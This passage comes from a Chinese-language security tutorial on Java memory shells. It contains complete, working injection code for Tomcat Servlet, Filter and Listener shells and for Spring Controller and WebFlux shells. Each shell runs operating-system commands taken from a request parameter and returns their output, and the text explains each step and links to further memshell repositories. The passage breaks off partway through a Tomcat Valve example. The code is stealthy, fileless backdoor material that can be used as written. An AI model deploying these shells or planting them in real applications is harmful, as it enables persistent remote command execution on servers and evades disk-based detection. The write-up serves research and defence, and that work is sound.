cmd).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); &#125; &#125; @Override public String getServletInfo() &#123; return null; &#125; @Override public void destroy() &#123; &#125;&#125;; 可以看到，除了service代码之外，我们还编写了init、getServletConfig、getServletInfo和destroy方法，可是它们并没有用到，要么返回null，要么直接留空不写，那我们为什么还要写这四个方法呢？ 那我们就来试试看注释掉之后会怎么样： 报错：Class &#39;Anonymous class derived from Servlet&#39; must implement abstract method &#39;init(ServletConfig)&#39; in &#39;Servlet&#39;。 我们直接跟进Servlet类，可以看到其是一个接口： 原来，在Java中，接口中的方法默认都是抽象的，除非在Java 8及以后的版本中使用了默认方法。并且，如果一个类实现了某个接口，那么它必须提供该接口中所有抽象方法的具体实现，这就是我们必须要写出上述四个方法的原因。 这里我使用cmd /c来实现可以执行带有空格的命令，例如我在3.1.1中举例的echo 世界，你好！；对于Linux系统，那就是/bin/sh -c；接着就是关于输入或者返回结果中带有中文的情况的处理，我们需要设置编码为GBK即可，当然这个就需要具体情况具体对待了。 接着我们需要完成后续的六个任务：创建Wapper对象、设置Servlet的LoadOnStartUp的值、设置Servlet的Name、设置Servlet对应的Class、将Servlet添加到context的children中、将url路径和servlet类做映射，代码如下： 1234567Wrapper wrapper = standardContext.createWrapper();wrapper.setName(servletName);wrapper.setServlet(servlet);wrapper.setServletClass(servlet.getClass().getName());wrapper.setLoadOnStartup(1);standardContext.addChild(wrapper);standardContext.addServletMappingDecoded(servletURL, servletName); 前面几步在之前已经讲过了，这个standardContext.addChild(wrapper);是为了让我们自定义的servlet成为Web应用程序的一部分；然后standardContext.addServletMappingDecoded(servletURL, servletName);也可以写成如下形式： 123// 要引入：&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationServletRegistration&quot; %&gt;ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);dynamic.addMapping(servletURL); 3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解请参考Skay师傅和yzddmr6师傅的文章，他们写的非常详细，这里直接贴出链接： https://yzddmr6.com/posts/tomcat-context/ https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew 引用Skay师傅的一句话总结： ServletContext是Servlet规范；org.apache.catalina.core.ApplicationContext是ServletContext的实现；org.apache.catalina.Context接口是tomcat容器结构中的一种容器，代表的是一个web应用程序，是tomcat独有的，其标准实现是org.apache.catalina.core.StandardContext，是tomcat容器的重要组成部分。 关于StandardContext的获取方法，除了本文中提到的将我们的ServletContext转为StandardContext从而获取context这个方法，还有以下两种方法： 从线程中获取StandardContext，参考Litch1师傅的文章：https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A 从MBean中获取，参考54simo师傅的文章：https://scriptboy.cn/p/tomcat-filter-inject/，不过这位师傅的博客已经关闭了，我们可以看存档：https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/ 从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：https://www.anquanke.com/post/id/198886 这两种方法，如果后面有时间的话我会补充完整。 3.2 Filter内存马3.2.1 简单的filter内存马demo编写根据我们在上面的2.6节中所讨论的内容，我们可以得出以下结论： 如果我们想要写一个Filter内存马，需要经过以下步骤： 参考：https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/ 获取StandardContext； 继承并编写一个恶意filter； 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中； 实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中； 通过反射获取filterConfigs，实例化一个FilterConfig（ApplicationFilterConfig）类，传入StandardContext与filterDefs，存放到filterConfig中。 参考：https://tyaoo.github.io/2021/12/06/Tomcat内存马/ 需要注意的是，一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常。 由以上结论我们可以写出如下内存马demo： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;%@ page import=&quot;java.lang.reflect.*&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;java.io.*&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;% ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); filterConfigsField.setAccessible(true); Map filterConfigs = (Map) filterConfigsField.get(standardContext); String filterName = getRandomString(); if (filterConfigs.get(filterName) == null) &#123; Filter filter = new Filter() &#123; @Override public void init(FilterConfig filterConfig) &#123; &#125; @Override public void destroy() &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest; String cmd = httpServletRequest.getParameter(&quot;cmd&quot;); &#123; InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot; + cmd).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; servletResponse.setCharacterEncoding(&quot;GBK&quot;); PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); &#125; filterChain.doFilter(servletRequest, servletResponse); &#125; &#125;; FilterDef filterDef = new FilterDef(); filterDef.setFilterName(filterName); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(filterName); filterMap.addURLPattern(&quot;/*&quot;); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(filterName, applicationFilterConfig); out.print(&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot; + filterName + &quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;); out.println(&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;); out.println(&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;); List&lt;String[]&gt; allUrlPatterns = new ArrayList&lt;&gt;(); for (Object filterConfigObj : filterConfigs.values()) &#123; if (filterConfigObj instanceof ApplicationFilterConfig) &#123; ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj; String filtername = filterConfig.getFilterName(); FilterDef filterdef = standardContext.findFilterDef(filtername); if (filterdef != null) &#123; FilterMap[] filterMaps = standardContext.findFilterMaps(); for (FilterMap filtermap : filterMaps) &#123; if (filtermap.getFilterName().equals(filtername)) &#123; String[] urlPatterns = filtermap.getURLPatterns(); allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中 out.println(&quot;&lt;tr&gt;&lt;td&gt;&quot; + filtername + &quot;&lt;/td&gt;&quot;); out.println(&quot;&lt;td&gt;&quot; + String.join(&quot;, &quot;, urlPatterns) + &quot;&lt;/td&gt;&lt;/tr&gt;&quot;); &#125; &#125; &#125; &#125; &#125; out.println(&quot;&lt;/table&gt;&quot;); for (String[] urlPatterns : allUrlPatterns) &#123; for (String pattern : urlPatterns) &#123; if (!pattern.equals(&quot;/*&quot;)) &#123; out.println(&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot; + pattern + &quot;?cmd=ipconfig&lt;br&gt;&quot;); &#125; &#125; &#125; &#125;%&gt;&lt;%! private String getRandomString() &#123; String characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; StringBuilder randomString = new StringBuilder(); for (int i = 0; i &lt; 8; i++) &#123; int index = (int) (Math.random() * characters.length()); randomString.append(characters.charAt(index)); &#125; return randomString.toString(); &#125;%&gt; 效果如下： 同样的，这里我也适配了中文编码，和一些提示性语句的输出。 3.2.2 servlet内存马demo代码分析我们分开来分析，首先看这段代码： 12345678910ServletContext servletContext = request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);filterConfigsField.setAccessible(true);Map filterConfigs = (Map) filterConfigsField.get(standardContext); 先是获取当前的servlet上下文并拿到其私有字段context，然后设置可访问，这样就可以通过反射这个context字段的值，这个值是一个ApplicationContext对象；接着获取ApplicationContext的私有字段context并设置可访问，然后通过反射获取ApplicationContext的context字段的值，这个值是一个StandardContext对象；最后是获取StandardContext的私有字段filterConfigs，设置可访问之后通过反射获取StandardContext的filterConfigs字段的值。 中间的构造匿名类的部分就不说了，和之前的Servlet是很像的，别忘记最后的filterChain.doFilter就行。 然后是这段代码： 1234567891011121314FilterDef filterDef = new FilterDef();filterDef.setFilterName(filterName);filterDef.setFilterClass(filter.getClass().getName());filterDef.setFilter(filter);standardContext.addFilterDef(filterDef);FilterMap filterMap = new FilterMap();filterMap.setFilterName(filterName);filterMap.addURLPattern(&quot;/*&quot;);filterMap.setDispatcher(DispatcherType.REQUEST.name());standardContext.addFilterMapBefore(filterMap);Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);filterConfigs.put(filterName, applicationFilterConfig); 也就是定义我们自己的filterDef和FilterMap并加入到srandardContext中，接着反射获取 ApplicationFilterConfig 类的构造函数并将构造函数设置为可访问，然后创建了一个 ApplicationFilterConfig 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 Map 中，filterName 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。 需要注意的是，在tomcat 7及以前FilterDef和FilterMap这两个类所属的包名是： 12&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterDef&quot; %&gt; tomcat 8及以后，包名是这样的： 12&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt; 由于这方面的区别，最好是直接都用反射去写这个filter内存马，具体demo参考： https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java 还有个需要注意的点就是，我给出的这个demo代码只适用于tomcat 7及以上，因为 filterMap.setDispatcher(DispatcherType.REQUEST.name());这行代码中用到的DispatcherType是在Servlet 3.0规范中才有的。 3.2.3 tomcat6下filter内存马的编写这里直接贴出参考文章，后面有空的话，会在我的博客中补全这部分的研究： https://xz.aliyun.com/t/9914 https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ https://www.cnblogs.com/CoLo/p/16840371.html https://flowerwind.github.io/2021/10/11/tomcat6、7、8、9内存马/ https://9bie.org/index.php/archives/960/ https://github.com/xiaopan233/GenerateNoHard https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell 3.3 Listener内存马3.3.1 简单的Listener内存马demo编写根据我们在上面的2.9节中所讨论的内容，我们可以得出以下结论： 如果我们想要写一个Listener内存马，需要经过以下步骤： 继承并编写一个恶意Listener 获取StandardContext 调用StandardContext.addApplicationEventListener()添加恶意Listener 由以上结论我们可以写出如下内存马demo： 1234567891011121314151617181920212223242526272829303132333435363738&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%! public class EvilListener implements ServletRequestListener &#123; public void requestDestroyed(ServletRequestEvent sre) &#123; HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); if (req.getParameter(&quot;cmd&quot;) != null)&#123; InputStream in = null; try &#123; in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)&#125;).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String out = s.hasNext()?s.next():&quot;&quot;; Field requestF = req.getClass().getDeclaredField(&quot;request&quot;); requestF.setAccessible(true); Request request = (Request)requestF.get(req); request.getResponse().setCharacterEncoding(&quot;GBK&quot;); request.getResponse().getWriter().write(out); &#125; catch (Exception ignored) &#123;&#125; &#125; &#125; public void requestInitialized(ServletRequestEvent sre) &#123;&#125; &#125;%&gt;&lt;% Field reqF = request.getClass().getDeclaredField(&quot;request&quot;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext context = (StandardContext) req.getContext(); EvilListener evilListener = new EvilListener(); context.addApplicationEventListener(evilListener); out.println(&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig&quot;);%&gt; 效果如下： 3.3.2 Listener内存马demo代码分析最关键部分的代码如下： 123456Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);reqF.setAccessible(true);Request req = (Request) reqF.get(request);StandardContext context = (StandardContext) req.getContext();EvilListener evilListener = new EvilListener();context.addApplicationEventListener(evilListener); 前面四行代码干一件事：获取StandardContext；后两行干代码干这两件事：实例化我们编写的恶意Listener，调用addApplicationEventListener方法加入到applicationEventListenersList中去，这样最终就会到eventListener。 四、Spring MVC框架型内存马4.1 Spring Controller型内存马4.1.1 简单的Spring Controller型内存马demo编写由2.11.2.2节中的分析可知，要编写一个spring controller型内存马，需要经过以下步骤： 获取WebApplicationContext 获取RequestMappingHandlerMapping实例 通过反射获得自定义Controller的恶意方法的Method对象 定义RequestMappingInfo 动态注册Controller 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package org.example.springcontrollermemoryshellexample.demos.web;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.InputStream;import java.lang.reflect.Method;import java.util.Scanner;@RestControllerpublic class TestEvilController &#123; private String getRandomString() &#123; String characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; StringBuilder randomString = new StringBuilder(); for (int i = 0; i &lt; 8; i++) &#123; int index = (int) (Math.random() * characters.length()); randomString.append(characters.charAt(index)); &#125; return randomString.toString(); &#125; @RequestMapping(&quot;/inject&quot;) public String inject() throws Exception&#123; String controllerName = &quot;/&quot; + getRandomString(); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Method method = InjectedController.class.getMethod(&quot;cmd&quot;); PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName); RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition(); RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null); InjectedController injectedController = new InjectedController(); requestMappingHandlerMapping.registerMapping(info, injectedController, method); return &quot;[+] Inject successfully!&lt;br&gt;[+] shell url: http://localhost:8080&quot; + controllerName + &quot;?cmd=ipconfig&quot;; &#125; @RestController public static class InjectedController &#123; public InjectedController()&#123; &#125; public void cmd() throws Exception &#123; HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); response.setCharacterEncoding(&quot;GBK&quot;); if (request.getParameter(&quot;cmd&quot;) != null) &#123; boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123; isLinux = false; &#125; String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in, &quot;GBK&quot;).useDelimiter(&quot;\\\\A&quot;); String output = s.hasNext() ? s.next() : &quot;&quot;; response.getWriter().write(output); response.getWriter().flush(); response.getWriter().close(); &#125; &#125; &#125;&#125; 运行效果： 4.1.2 Spring Controller型内存马demo代码分析代码的关键在于如下这几行： 12345678WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);Method method = InjectedController.class.getMethod(&quot;cmd&quot;);PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);InjectedController injectedController = new InjectedController();requestMappingHandlerMapping.registerMapping(info, injectedController, method); 这段代码先利用RequestContextHolder获取当前请求的WebApplicationContext，这个RequestContextHolder是Spring框架提供的用于存储和访问请求相关信息的工具类；接着从上一步中获取到的WebApplicationContext中获取RequestMappingHandlerMapping Bean；接着通过反射获得我们自定义Controller的恶意方法的Method对象，然后就是拿到对应的RequestMappingInfo对象；通过bean实例+处理请求的method+对应的RequestMappinginfo对象即可调用registerMapping方法动态添加恶意controller。 4.2 Spring Interceptor型内存马由2.11.2.3节的分析我们很容易得出Spring Interceptor型内存马的编写思路： 获取ApplicationContext 通过AbstractHandlerMapping反射来获取adaptedInterceptors 将要注入的恶意拦截器放入到adaptedInterceptors中 具体代码我会放到针对实际中间件打内存马那里。 4.3 Spring WebFlux内存马4.3.1 简单的Spring WebFlux内存马demo编写由2.12.5节的分析我们可以写出下面的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117package org.example.webfluxmemoryshelldemo.memoryshell;import org.springframework.boot.web.embedded.netty.NettyWebServer;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.buffer.DataBuffer;import org.springframework.core.io.buffer.DefaultDataBufferFactory;import org.springframework.http.MediaType;import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.http.server.reactive.ServerHttpResponse;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.server.WebFilter;import org.springframework.web.server.WebFilterChain;import org.springframework.web.server.WebHandler;import org.springframework.web.server.adapter.HttpWebHandlerAdapter;import org.springframework.web.server.handler.DefaultWebFilterChain;import org.springframework.web.server.handler.ExceptionHandlingWebHandler;import org.springframework.web.server.handler.FilteringWebHandler;import reactor.core.publisher.Flux;import reactor.core.publisher.Mono;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.lang.reflect.Array;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.lang.reflect.Modifier;import java.nio.charset.StandardCharsets;import java.util.ArrayList;import java.util.List;@Configurationpublic class MemoryShellFilter implements WebFilter&#123; public static void doInject() &#123; Method getThreads; try &#123; getThreads = Thread.class.getDeclaredMethod(&quot;getThreads&quot;); getThreads.setAccessible(true); Object threads = getThreads.invoke(null); for (int i = 0; i &lt; Array.getLength(threads); i++) &#123; Object thread = Array.get(threads, i); if (thread != null &amp;&amp; thread.getClass().getName().contains(&quot;NettyWebServer&quot;)) &#123; NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &quot;this$0&quot;, false); ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &quot;handler&quot;, false); Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&quot;httpHandler&quot;, false); HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&quot;delegate&quot;, false); ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&quot;delegate&quot;, true); FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&quot;delegate&quot;, true); DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&quot;chain&quot;, false); Object handler = getFieldValue(defaultWebFilterChain, &quot;handler&quot;, false); List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters()); newAllFilters.add(0, new MemoryShellFilter()); DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters); Field f = filteringWebHandler.getClass().getDeclaredField(&quot;chain&quot;); f.setAccessible(true); Field modifersField = Field.class.getDeclaredField(&quot;modifiers&quot;); modifersField.setAccessible(true); modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL); f.set(filteringWebHandler, newChain); modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL); &#125; &#125; &#125; catch (Exception ignored) &#123;&#125; &#125; public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception &#123; Field f; if(superClass)&#123; f = obj.getClass().getSuperclass().getDeclaredField(fieldName); &#125;else &#123; f = obj.getClass().getDeclaredField(fieldName); &#125; f.setAccessible(true); return f.get(obj); &#125; public Flux&lt;DataBuffer&gt; getPost(ServerWebExchange exchange) &#123; ServerHttpRequest request = exchange.getRequest(); String path = request.getURI().getPath(); String query = request.getURI().getQuery(); if (path.equals(&quot;/evil/cmd&quot;) &amp;&amp; query != null &amp;&amp; query.startsWith(&quot;command=&quot;)) &#123; String command = query.substring(8); try &#123; Process process = Runtime.getRuntime().exec(&quot;cmd /c&quot; + command); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), &quot;GBK&quot;)); Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; &#123; try &#123; String line; while ((line = reader.readLine()) != null) &#123; sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8))); &#125; sink.complete(); &#125; catch (IOException ignored) &#123;&#125; &#125;); exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN); return response; &#125; catch (IOException ignored) &#123;&#125; &#125; return Flux.empty(); &#125; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) &#123; if (exchange.getRequest().getURI().getPath().startsWith(&quot;/evil/&quot;)) &#123; doInject(); Flux&lt;DataBuffer&gt; response = getPost(exchange); ServerHttpResponse serverHttpResponse = exchange.getResponse(); serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN); return serverHttpResponse.writeWith(response); &#125; else &#123; return chain.filter(exchange); &#125; &#125;&#125; 4.3.2 Spring WebFlux内存马demo代码分析从之前的分析我们知道，主要思路就是通过反射找到DefaultWebFilterChain，然后拿到filters，把我们的filter插入到其中的第一位，再用这个filters重新调用公共构造函数DefaultWebFilterChain，赋值给之前分析里面我没看到的this.chain即可。 思路就是这么个思路，我们来看具体的代码。 先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为NettyWebServer实例。如果发现一个线程是NettyWebServer，那就继续下一步的操作。接下来就是找DefaultWebFilterChain对象： 1234567NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &quot;this$0&quot;, false);ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &quot;handler&quot;, false);Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&quot;httpHandler&quot;, false);HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&quot;delegate&quot;, false);ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&quot;delegate&quot;, true);FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&quot;delegate&quot;, true);DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&quot;chain&quot;, false); 这条链子在之前的分析中已经提到过，一步步调用我们写的getFieldValue函数即可。 然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位： 1234Object handler = getFieldValue(defaultWebFilterChain, &quot;handler&quot;, false);List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters());newAllFilters.add(0, new MemoryShellFilter());DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters); 然后通过反射获取FilteringWebHandler的私有字段chain，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链newChain，然后恢复字段的可访问权限： 1234567Field f = filteringWebHandler.getClass().getDeclaredField(&quot;chain&quot;);f.setAccessible(true);Field modifersField = Field.class.getDeclaredField(&quot;modifiers&quot;);modifersField.setAccessible(true);modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);f.set(filteringWebHandler, newChain);modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL); 这里补充一下上面的modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);和modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);的含义，第一个代码意思就是使用反射机制，通过modifersField对象来修改字段的修饰符，f.getModifiers()返回字段f的当前修饰符，然后通过位运算&amp; ~Modifier.FINAL，将当前修饰符的FINAL位清除（置为0），表示移除了FINAL修饰符；第二个则是把字段的修饰符重新设置为包含FINAL修饰符的修饰符，这样就可以保持字段的封装性。 五、中间件型内存马5.1 Tomcat Valve型内存马我这里是新建了一个项目，并创建配置好了web目录和tomcat环境，pom.xml中的依赖如下： 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.83&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 如果idea启动tomcat报错，可以看看是不是你开了网易云哈哈哈： 在web目录下新建一个666.jsp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.*&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% Field requestField = request.getClass().getDeclaredField(&quot;request&quot;); requestField.setAccessible(true); final Request req = (Request) requestField.get(request); StandardContext standardContext 